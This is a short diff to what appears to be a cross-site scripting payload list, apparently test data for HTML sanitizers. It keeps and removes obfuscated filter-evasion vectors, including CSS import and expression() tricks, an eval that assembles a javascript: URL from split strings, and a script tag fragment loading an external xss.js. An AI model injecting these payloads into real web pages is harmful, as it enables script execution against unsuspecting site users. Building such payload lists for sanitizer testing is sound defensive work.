@@ -7,14 +7,4 @@
 <style>@im\port'\ja\vasc\ript:alert("XSS")';</style>
 <img style="xss:expr/*XSS*/ession(alert('XSS'))">
 
-exp/*<a style="no\xss:noxss(&quot;*//*&quot;);xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))">
-
-a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
-
-
-PT SRC="http://ha.ckers.org/xss.js"&gt;
-<button>TESTHTML5FORMACTION
-</button><button>crosssitespt
-
-<img src="x">
 <style><img src="</style><img src="x">
